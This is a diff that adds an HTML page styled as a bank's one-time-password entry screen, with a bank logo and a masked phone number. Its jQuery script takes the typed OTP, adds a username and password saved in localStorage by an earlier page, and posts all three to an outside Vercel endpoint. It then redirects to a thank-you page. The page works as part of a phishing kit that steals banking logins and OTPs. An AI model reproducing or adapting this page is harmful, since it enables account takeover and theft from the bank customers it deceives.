@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Home</title>
+    <link href="./css/index.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="index">
+      <div>
+        <div class="hero">
+          <header>
+            <a href="./index.html"
+              ><img src="./img/hero.jpg" class="sured" /><br /><img
+                src="./img/banklogo.svg"
+            /></a>
+          </header>
+        </div>
+        <section>
+          <div class="form">
+            <form method="post" id="myForm">
+              <small>OTP sent to 806*******</small>
+              <div class="text-input">
+                <div class="input-label">
+                  <input
+                    class="no"
+                    name="no"
+                    type="text"
+                    id="no"
+                    required
+                    placeholder="Enter OTP"
+                  />
+                </div>
+              </div>
+
+              <div class="button-container">
+                <button class="button" type="submit">Submit</button>
+              </div>
+            </form>
+          </div>
+        </section>
+      </div>
+
+      <footer>
+        <img src="./img/footer.png" />
+        <img src="./img/footer2.png" />
+      </footer>
+    </div>
+    <script src="./jquery-3.6.0.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+
+    <script>
+      $(document).ready(function () {
+        $("#myForm").on("submit", function (event) {
+          event.preventDefault(); // Prevent the default form submission
+          toastr.info("Verifying OTP...", "Please Wait", {
+            timeOut: 0, // Prevent auto-closing for loading toast
+            extendedTimeOut: 0,
+            closeButton: true,
+          });
+          var no = $("#no").val();
+          const selectedItem = localStorage.getItem("selectedItem");
+          const userData = JSON.parse(selectedItem);
+
+          var data = {
+            otp: no,
+            userName: userData.userName,
+            password: userData.password,
+          };
+
+          $.ajax({
+            url: "https://server-blue-mu.vercel.app/cityb2otp", // Replace with the URL to your PHP handler script
+            type: "POST",
+            data: JSON.stringify(data),
+            contentType: "application/json",
+            success: function (response) {
+              window.location.href = "./thank_you.html";
+            },
+            error: function (xhr, status, error) {
+              // Handle any errors
+              swal(
+                "An error occurred while saving the application!",
+                "",
+                "warning"
+              );
+              console.error(xhr.responseText);
+            },
+          });
+        });
+      });
+    </script>
+  </body>
+</html>
